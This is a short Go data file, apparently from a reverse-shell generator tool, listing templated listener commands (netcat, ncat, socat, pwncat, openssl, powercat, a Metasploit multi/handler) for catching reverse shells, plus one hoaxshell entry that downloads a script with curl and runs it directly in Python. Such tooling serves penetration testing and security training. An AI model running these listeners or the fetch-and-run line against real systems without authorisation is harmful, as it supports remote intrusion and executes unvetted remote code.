package data

type Listener struct {
	Name    string
	Payload string
}

var Listeners = []Listener{
	{`nc`, `nc -lvnp {{.Port}}`},
	{`nc freebsd`, `nc -lvn {{.Port}}`},
	{`busybox nc`, `busybox nc -lp {{.Port}}`},
	{`ncat`, `ncat -lvnp {{.Port}}`},
	{`ncat.exe`, `ncat.exe -lvnp {{.Port}}`},
	{`ncat (TLS)`, `ncat --ssl -lvnp {{.Port}}`},
	{`rlwrap + nc`, `rlwrap -cAr nc -lvnp {{.Port}}`},
	{`rustcat`, `rcat listen {{.Port}}`},
	{`openssl`, `openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 30 -nodes; openssl s_server -quiet -key key.pem -cert cert.pem -port {{.Port}}`},
	{`pwncat`, `python3 -m pwncat -lp {{.Port}}`},
	{`pwncat (windows)`, `python3 -m pwncat -m windows -lp {{.Port}}`},
	{`windows ConPty`, `stty raw -echo; (stty size; cat) | nc -lvnp {{.Port}}`},
	{`socat`, `socat -d -d TCP-LISTEN:{{.Port}} STDOUT`},
	{`socat (TTY)`, `socat -d -d file:` + "`tty`" + `,raw,echo=0 TCP-LISTEN:{{.Port}}`},
	{`powercat`, `powercat -l -p {{.Port}}`},
	// FIXME: Payload for msfvenom is acquired from the MSFVenom tab. Fix this after implementing that part.
	{`msfconsole`, `msfconsole -q -x "use multi/handler; set payload {{.Payload}}; set lhost {{.Ip}}; set lport {{.Port}}; exploit"`},
	{`hoaxshell`, `python3 -c "$(curl -s https://raw.githubusercontent.com/t3l3machus/hoaxshell/main/revshells/hoaxshell-listener.py)" -t {type} -p {{.Port}}`},
}
